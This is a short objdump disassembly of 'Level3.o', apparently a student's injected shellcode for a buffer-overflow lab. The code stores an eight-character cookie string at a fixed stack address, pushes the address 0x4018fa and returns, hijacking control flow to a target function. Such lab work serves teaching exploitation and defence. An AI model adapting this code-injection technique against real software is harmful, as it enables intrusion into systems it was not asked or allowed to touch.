
Level3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 00 60 58 55 	mov    $0x55586000,%rdi
   7:	48 c7 c0 35 39 62 39 	mov    $0x39623935,%rax
   e:	48 c7 c1 39 37 66 61 	mov    $0x61663739,%rcx
  15:	48 89 07             	mov    %rax,(%rdi)
  18:	48 89 4f 04          	mov    %rcx,0x4(%rdi)
  1c:	68 fa 18 40 00       	push   $0x4018fa
  21:	c3                   	ret    
